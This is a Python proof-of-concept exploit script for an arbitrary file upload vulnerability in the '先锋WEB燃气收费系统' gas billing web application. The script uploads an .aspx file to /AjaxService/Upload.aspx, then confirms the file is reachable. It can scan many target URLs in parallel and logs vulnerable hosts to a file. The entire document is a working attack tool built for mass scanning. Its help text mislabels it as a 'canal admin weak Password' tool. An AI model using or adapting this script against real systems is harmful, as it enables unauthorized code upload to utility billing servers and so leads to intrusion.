# -*- coding: utf-8 -*-
import argparse
import base64
import re
import sys
from multiprocessing.dummy import Pool

import requests
import urllib3
from rich.console import Console

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def banner():
    test = """
           8b        d8   88           88      a8P  88 888b      88   ,ad8888ba,   
            Y8,    ,8P  ,d88           88    ,88' ,d88 8888b     88  d8"'    `"8b  
             Y8,  ,8P 888888           88  ,88" 888888 88 `8b    88 d8'            
              "8aa8"      88           88,d88'      88 88  `8b   88 88             
               `88'       88           8888"88,     88 88   `8b  88 88      88888  
                88        88           88P   Y8b    88 88    `8b 88 Y8,        88  
                88        88           88     "88,  88 88     `888   `"Y88888P"   

                            888888888888 

                            tag: this is a  先锋WEB燃气收费系统 Upload.aspx 文件上传漏洞 poc                                       
                                        @version: 1.0.0   @author: Y1_K1NG           
    """
    print(test)


def poc(target):
    if target[-1] == '/':
        target = target[:-1]
    else:
        target = target
    url = target + "/AjaxService/Upload.aspx"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        #"Content-Type": "multipart/form-data; boundary=------------GFioQpMK0vv2",
        "Upgrade-Insecure-Requests": "1"
    }
#     data = '''------------GFioQpMK0vv2
# Content-Disposition: form-data; name="Fdata"; filename="y1.aspx"
# Content-Type: application/octet-stream
#
# <% Response.Write("+v y1k1ng1227") %>
# ------------GFioQpMK0vv2
# Content-Disposition: form-data; name="submit"
#
# Submin
# ------------GFioQpMK0vv2'''
    data = {
        "submit": "Submin"
    }

    files = {
        "Fdata": ("1.aspx", "<% Response.Write(\"+v y1k1ng1227\") %>", "application/octet-stream")
    }


    try:
        response = requests.post(url, headers=headers, data=data, files=files, verify=False, timeout=15)
        # print(response.request.headers)
        # print(response.request.body)
        # print(response.text)
        response_text = response.text
        start_index = response_text.find("\\UploadFile\\")
        if response.status_code == 200 :
            if start_index != -1:
                end_index = response_text.find(".aspx", start_index)
                if end_index != -1:
                    file_path = response_text[start_index:end_index + 5]
                    url2 = target + file_path.replace("\\", "/")
                    r2 = requests.get(url=url2)
                    if r2.status_code == 200:
                        print(f"[+] {target} 存在 任意文件上传 {url2}")
                        with open("result.txt", "a+", encoding="utf-8") as f:
                            f.write(url2 + "\n")
                    else :
                        print(f"[+] {url2} 访问失败 ")
                else:
                    print("End index not found")
            else:
                print("Start index not found")
        else:
            print(f"[-] {target} 不存在 任意文件上传")
    except Exception as e:
        print(f"[*] {target} error: {str(e)}")


def extract_host(url):
    """
    从 URL 中提取主机地址和端口号，返回 (host, port)
    """
    match = re.search(r"(http://|https://)?([\w\.]+):?(\d+)?", url)
    if match:
        prefix, host, port = match.groups()
        if not port:
            if prefix and "https" in prefix:
                port = "443"
            else:
                port = "80"
        return host, int(port)
    else:
        return None, None


def main():
    banner()
    parser = argparse.ArgumentParser(description='canal admin weak Password')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()

    if args.url and not args.file:
        if "https://" in args.url or "http://" in args.url:
            url = args.url
        else:
            host, port = extract_host(args.url)
            url = f"http://{host}:{port}"
        poc(url)

    elif args.url is None and args.file is not None:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url = url.strip().replace("\n", "")
                if "https://" in url or "http://" in url:
                    url = url
                else:
                    host, port = extract_host(url)
                    url = f"http://{host}:{port}"
                url_list.append(url)

        pool = Pool(10)
        pool.map(poc, url_list)
        pool.close()
        pool.join()

    else:
        parser.print_help()


if __name__ == '__main__':
    main()
